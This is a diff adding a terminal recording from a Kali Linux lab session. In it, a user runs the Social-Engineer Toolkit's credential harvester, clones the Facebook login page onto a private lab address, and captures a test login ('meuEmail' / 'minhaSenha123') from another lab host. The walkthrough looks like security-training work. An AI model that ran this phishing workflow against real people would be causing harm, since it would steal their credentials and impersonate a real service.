@@ -1,0 +1,329 @@
+Script started on 2024-12-17 08:36:32-03:00 [TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="155" LINES="43"]
+                                                                                                                                                           ]0;root@kali: /home/kali[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m/home/kali[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[4ms[24m[4ms[4me[24m[24m[36ms[24m[36me[36mt[39m[39m[4ms[39m[4me[39m[4mt[4mo[24m[4mo[4mo[24m[4mo[4ml[24m[4ml[4mk[24m[4mk[4mi[24m[8D[24m[36ms[24m[36me[24m[36mt[24m[36mo[24m[36mo[24m[36ml[24m[36mk[24m[36mi[36mt[39m[?1l>[?2004l
+[94m[1m[-] [0mNew set.config.py file generated on: 2024-12-17 08:36:54.570471
+[94m[1m[-] [0mVerifying configuration update...
+[92m[1m[*] [0mUpdate verified, config timestamp is: 2024-12-17 08:36:54.570471
+[92m[1m[*] [0mSET is using the new config, no need to restart
+Copyright 2020, The Social-Engineer Toolkit (SET) by TrustedSec, LLC
+All rights reserved.
+
+Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
+
+    * Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
+    * Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
+    * Neither the name of Social-Engineer Toolkit nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
+
+THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+
+The above licensing was taken from the BSD licensing and is applied to Social-Engineer Toolkit as well.
+
+Note that the Social-Engineer Toolkit is provided as is, and is a royalty free open-source application.
+
+Feel free to modify, use, change, market, do whatever you want with it as long as you give the appropriate credit where credit is due (which means giving the authors the credit they deserve for writing it).
+
+Also note that by using this software, if you ever see the creator of SET in a bar, you should (optional) give him a hug and should (optional) buy him a beer (or bourbon - hopefully bourbon). Author has the option to refuse the hug (most likely will never happen) or the beer or bourbon (also most likely will never happen). Also by using this tool (these are all optional of course!), you should try to make this industry better, try to stay positive, try to help others, try to learn from one another, try stay out of drama, try offer free hugs when possible (and make sure recipient agrees to mutual hug), and try to do everything you can to be awesome.
+[91mThe Social-Engineer Toolkit is designed purely for good and not evil. If you are planning on using this tool for malicious purposes that are not authorized by the company you are performing assessments for, you are violating the terms of service and license of this toolset. By hitting yes (only one time), you agree to the terms of service and that you will only use this tool for lawful purposes only.[0m
+[92m
+
+Do you agree to the terms of service [y/n]: y
+[0m
+[H[2J[3J[92m
+          _______________________________
+         /   _____/\_   _____/\__    ___/
+         \_____  \  |    __)_   |    |
+         /        \ |        \  |    |
+        /_______  //_______  /  |____|
+                \/         \/            [0m
+[94m
+[---]        The Social-Engineer Toolkit ([93mSET[94m)         [---]
+[---]        Created by:[91m David Kennedy [94m([93mReL1K[94m)         [---]
+                      Version: [91m8.0.3[94m
+                    Codename: '[93mMaverick[0m[94m'
+[---]        Follow us on Twitter: [95m@TrustedSec[94m         [---]
+[---]        Follow me on Twitter: [95m@HackingDave[94m        [---]
+[---]       Homepage: [93mhttps://www.trustedsec.com[94m       [---]
+[92m        Welcome to the Social-Engineer Toolkit (SET).
+         The one stop shop for all of your SE needs.
+
+[1m   The Social-Engineer Toolkit is a product of TrustedSec.
+
+           Visit: [92mhttps://www.trustedsec.com
+[0m
+[94m   It's easy to update using the PenTesters Framework! (PTF)
+Visit [93mhttps://github.com/trustedsec/ptf[94m to update all your tools!
+
+[0m
+ Select from the menu:
+
+   1) Social-Engineering Attacks
+   2) Penetration Testing (Fast-Track)
+   3) Third Party Modules
+   4) Update the Social-Engineer Toolkit
+   5) Update SET configuration
+   6) Help, Credits, and About
+
+  99) Exit the Social-Engineer Toolkit
+
+[4m[36mset[0m> 1
+[H[2J[3J[93m
+              ________________________
+              __  ___/__  ____/__  __/
+              _____ \__  __/  __  /
+              ____/ /_  /___  _  /
+              /____/ /_____/  /_/     [0m
+[94m
+[---]        The Social-Engineer Toolkit ([93mSET[94m)         [---]
+[---]        Created by:[91m David Kennedy [94m([93mReL1K[94m)         [---]
+                      Version: [91m8.0.3[94m
+                    Codename: '[93mMaverick[0m[94m'
+[---]        Follow us on Twitter: [95m@TrustedSec[94m         [---]
+[---]        Follow me on Twitter: [95m@HackingDave[94m        [---]
+[---]       Homepage: [93mhttps://www.trustedsec.com[94m       [---]
+[92m        Welcome to the Social-Engineer Toolkit (SET).
+         The one stop shop for all of your SE needs.
+
+[1m   The Social-Engineer Toolkit is a product of TrustedSec.
+
+           Visit: [92mhttps://www.trustedsec.com
+[0m
+[94m   It's easy to update using the PenTesters Framework! (PTF)
+Visit [93mhttps://github.com/trustedsec/ptf[94m to update all your tools!
+
+[0m
+ Select from the menu:
+
+   1) Spear-Phishing Attack Vectors
+   2) Website Attack Vectors
+   3) Infectious Media Generator
+   4) Create a Payload and Listener
+   5) Mass Mailer Attack
+   6) Arduino-Based Attack Vector
+   7) Wireless Access Point Attack Vector
+   8) QRCode Generator Attack Vector
+   9) Powershell Attack Vectors
+  10) Third Party Modules
+
+  99) Return back to the main menu.
+
+[4m[36mset[0m> 2
+
+The Web Attack module is a unique way of utilizing multiple web-based attacks in order to compromise the intended victim.
+
+The [1mJava Applet Attack[0m method will spoof a Java Certificate and deliver a Metasploit-based payload. Uses a customized java applet created by Thomas Werth to deliver the payload.
+
+The [1mMetasploit Browser Exploit[0m method will utilize select Metasploit browser exploits through an iframe and deliver a Metasploit payload.
+
+The [1mCredential Harvester[0m method will utilize web cloning of a web- site that has a username and password field and harvest all the information posted to the website.
+
+The [1mTabNabbing[0m method will wait for a user to move to a different tab, then refresh the page to something different.
+
+The [1mWeb-Jacking Attack[0m method was introduced by white_sheep, emgent. This method utilizes iframe replacements to make the highlighted URL link to appear legitimate however when clicked a window pops up then is replaced with the malicious link. You can edit the link replacement settings in the set_config if it's too slow/fast.
+
+The [1mMulti-Attack[0m method will add a combination of attacks through the web attack menu. For example, you can utilize the Java Applet, Metasploit Browser, Credential Harvester/Tabnabbing all at once to see which is successful.
+
+The [1mHTA Attack[0m method will allow you to clone a site and perform PowerShell injection through HTA files which can be used for Windows-based PowerShell exploitation through the browser.
+
+   1) Java Applet Attack Method
+   2) Metasploit Browser Exploit Method
+   3) Credential Harvester Attack Method
+   4) Tabnabbing Attack Method
+   5) Web Jacking Attack Method
+   6) Multi-Attack Web Method
+   7) HTA Attack Method
+
+  99) Return to Main Menu
+
+[4m[36mset[0m:[4m[36mwebattack[0m>3
+
+ The first method will allow SET to import a list of pre-defined web
+ applications that it can utilize within the attack.
+
+ The second method will completely clone a website of your choosing
+ and allow you to utilize the attack vectors within the completely
+ same web application you were attempting to clone.
+
+ The third method allows you to import your own website, note that you
+ should only have an index.html when using the import website
+ functionality.
+   
+   1) Web Templates
+   2) Site Cloner
+   3) Custom Import
+
+  99) Return to Webattack Menu
+
+[4m[36mset[0m:[4m[36mwebattack[0m>2
+[94m[1m[-] [0mCredential harvester will allow you to utilize the clone capabilities within SET
+[94m[1m[-] [0mto harvest credentials or parameters from a website as well as place them into a report
+
+-------------------------------------------------------------------------------
+--- * IMPORTANT * READ THIS BEFORE ENTERING IN THE IP ADDRESS * IMPORTANT * ---
+
+The way that this works is by cloning a site and looking for form fields to
+rewrite. If the POST fields are not usual methods for posting forms this 
+could fail. If it does, you can always save the HTML, rewrite the forms to
+be standard forms and use the "IMPORT" feature. Additionally, really 
+important:
+
+If you are using an EXTERNAL IP ADDRESS, you need to place the EXTERNAL
+IP address below, not your NAT address. Additionally, if you don't know
+basic networking concepts, and you have a private IP address, you will
+need to do port forwarding to your NAT IP address from your external IP
+address. A browser doesn’t know how to communicate with a private IP
+address, so if you don't specify an external IP address if you are using
+this from an external perspective, it will not work. This isn't a SET issue
+this is how networking works.
+
+[4m[36mset[0m:[4m[36mwebattack[0m> IP address for the POST back in Harvester/Tabnabbing [10.0.2.4]: 
+[94m[1m[-] [0mSET supports both HTTP and HTTPS
+[94m[1m[-] [0mExample: http://www.thisisafakesite.com
+[4m[36mset[0m:[4m[36mwebattack[0m> Enter the url to clone: http://facebook.com
+[93m
+[*] Cloning the website: https://login.facebook.com/login.php
+[*] This could take a little bit...[0m
+[91m
+The best way to use this attack is if username and password form fields are available. Regardless, this captures all POSTs on a website.[0m
+[94m[*] The Social-Engineer Toolkit Credential Harvester Attack
+[*] Credential Harvester is running on port 80
+[*] Information will be displayed to you as it arrives below:[0m
+10.0.2.5 - - [17/Dec/2024 08:42:23] "GET / HTTP/1.1" 200 -
+[91m[*] WE GOT A HIT! Printing the output:[92m
+PARAM: jazoest=2806
+PARAM: lsd=AVr02S35JqE
+PARAM: display=
+PARAM: isprivate=
+PARAM: return_session=
+[91mPOSSIBLE USERNAME FIELD FOUND: skip_api_login=[92m
+PARAM: signed_next=
+PARAM: trynum=1
+PARAM: timezone=
+PARAM: lgndim=
+[91mPOSSIBLE PASSWORD FIELD FOUND: lgnrnd=033913_pinQ[92m
+PARAM: lgnjs=n
+[91mPOSSIBLE USERNAME FIELD FOUND: email=meuEmail[92m
+[91mPOSSIBLE PASSWORD FIELD FOUND: pass=minhaSenha123[92m
+[91mPOSSIBLE USERNAME FIELD FOUND: login=1[92m
+PARAM: prefill_contact_point=
+PARAM: prefill_source=
+PARAM: prefill_type=
+PARAM: first_prefill_source=
+PARAM: first_prefill_type=
+PARAM: had_cp_prefilled=false
+[91mPOSSIBLE PASSWORD FIELD FOUND: had_password_prefilled=false[92m
+PARAM: ab_test_data=
+[91m[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
+
+[0m
+10.0.2.5 - - [17/Dec/2024 08:43:31] "GET /favicon.ico HTTP/1.1" 404 -
+^C[94m[*] File in XML format exported to /root/.set/reports/2024-12-17 08:44:11.994263.xml for your reading pleasure...[0m
+
+      Press [91m<return> [0mto continue
+
+
+The Web Attack module is a unique way of utilizing multiple web-based attacks in order to compromise the intended victim.
+
+The [1mJava Applet Attack[0m method will spoof a Java Certificate and deliver a Metasploit-based payload. Uses a customized java applet created by Thomas Werth to deliver the payload.
+
+The [1mMetasploit Browser Exploit[0m method will utilize select Metasploit browser exploits through an iframe and deliver a Metasploit payload.
+
+The [1mCredential Harvester[0m method will utilize web cloning of a web- site that has a username and password field and harvest all the information posted to the website.
+
+The [1mTabNabbing[0m method will wait for a user to move to a different tab, then refresh the page to something different.
+
+The [1mWeb-Jacking Attack[0m method was introduced by white_sheep, emgent. This method utilizes iframe replacements to make the highlighted URL link to appear legitimate however when clicked a window pops up then is replaced with the malicious link. You can edit the link replacement settings in the set_config if it's too slow/fast.
+
+The [1mMulti-Attack[0m method will add a combination of attacks through the web attack menu. For example, you can utilize the Java Applet, Metasploit Browser, Credential Harvester/Tabnabbing all at once to see which is successful.
+
+The [1mHTA Attack[0m method will allow you to clone a site and perform PowerShell injection through HTA files which can be used for Windows-based PowerShell exploitation through the browser.
+
+   1) Java Applet Attack Method
+   2) Metasploit Browser Exploit Method
+   3) Credential Harvester Attack Method
+   4) Tabnabbing Attack Method
+   5) Web Jacking Attack Method
+   6) Multi-Attack Web Method
+   7) HTA Attack Method
+
+  99) Return to Main Menu
+
+[4m[36mset[0m:[4m[36mwebattack[0m>^C
+
+ Thank you for [91mshopping[0m with the Social-Engineer Toolkit.
+
+ Hack the Gibson...and remember...hugs are worth more than handshakes.
+
+[H[2J[3J[92m
+                          .  ..
+                       MMMMMNMNMMMM=
+                   .DMM.           .MM$
+                 .MM.                 MM,.
+                 MN.                    MM.
+               .M.                       MM
+              .M   .....................  NM
+              MM   .8888888888888888888.   M7
+             .M    88888888888888888888.   ,M
+             MM       ..888.MMMMM    .     .M.
+             MM         888.MMMMMMMMMMM     M
+             MM         888.MMMMMMMMMMM.    M
+             MM         888.      NMMMM.   .M
+              M.        888.MMMMMMMMMMM.   ZM
+              NM.       888.MMMMMMMMMMM    M:
+              .M+      .....              MM.
+               .MM.                     .MD
+                 MM .                  .MM
+                  $MM                .MM.
+                    ,MM?          .MMM
+                       ,MMMMMMMMMMM
+                https://www.trustedsec.com[0m
+[94m
+[---]        The Social-Engineer Toolkit ([93mSET[94m)         [---]
+[---]        Created by:[91m David Kennedy [94m([93mReL1K[94m)         [---]
+                      Version: [91m8.0.3[94m
+                    Codename: '[93mMaverick[0m[94m'
+[---]        Follow us on Twitter: [95m@TrustedSec[94m         [---]
+[---]        Follow me on Twitter: [95m@HackingDave[94m        [---]
+[---]       Homepage: [93mhttps://www.trustedsec.com[94m       [---]
+[92m        Welcome to the Social-Engineer Toolkit (SET).
+         The one stop shop for all of your SE needs.
+
+[1m   The Social-Engineer Toolkit is a product of TrustedSec.
+
+           Visit: [92mhttps://www.trustedsec.com
+[0m
+[94m   It's easy to update using the PenTesters Framework! (PTF)
+Visit [93mhttps://github.com/trustedsec/ptf[94m to update all your tools!
+
+[0m
+ Select from the menu:
+
+   1) Social-Engineering Attacks
+   2) Penetration Testing (Fast-Track)
+   3) Third Party Modules
+   4) Update the Social-Engineer Toolkit
+   5) Update SET configuration
+   6) Help, Credits, and About
+
+  99) Exit the Social-Engineer Toolkit
+
+[4m[36mset[0m> ^C
+
+Thank you for [91mshopping[0m with the Social-Engineer Toolkit.
+
+Hack the Gibson...and remember...hugs are worth more than handshakes.
+
+                                                                                                                                                           ]0;root@kali: /home/kali
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m/home/kali[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[4ms[24m[4ms[24m[38;2;153;153;153metoolkit[39m[8D[4ms[39m[4mc[24m[39m [39m [39m [39m [39m [39m [39m [4ms[4mc[4mr[24m[4mr[4mi[24m[4mi[4mp[24m[24m[36ms[24m[36mc[24m[36mr[24m[36mi[24m[36mp[36mt[39m[?1l>[?2004l
+Script started, output log file is 'typescript'.
+                                                                                                                                                           ]0;root@kali: /home/kali[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m/home/kali[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[?2004l
+                                                                                                                                                           ]0;root@kali: /home/kali
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m/home/kali[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[4me[24m[24m[36me[36mx[39m[39m[4me[39m[4mx[4mi[24m[24m[36me[24m[36mx[24m[36mi[36mt[39m[?1l>[?2004l
+Script done.
+                                                                                                                                                           ]0;root@kali: /home/kali
+[0m[27m[24m[J[34m┌──([1m[34m[31mroot㉿kali[0m[31m[34m)-[[1m[34m[39m/home/kali[0m[34m]
+└─[1m[34m[31m#[0m[31m[39m [K[?1h=[?2004h[4me[24m[24m[36me[36mx[39m[39m[4me[39m[4mx[4mi[24m[24m[36me[24m[36mx[24m[36mi[36mt[39m[?1l>[?2004l
+
+Script done on 2024-12-17 08:46:02-03:00 [COMMAND_EXIT_CODE="0"]
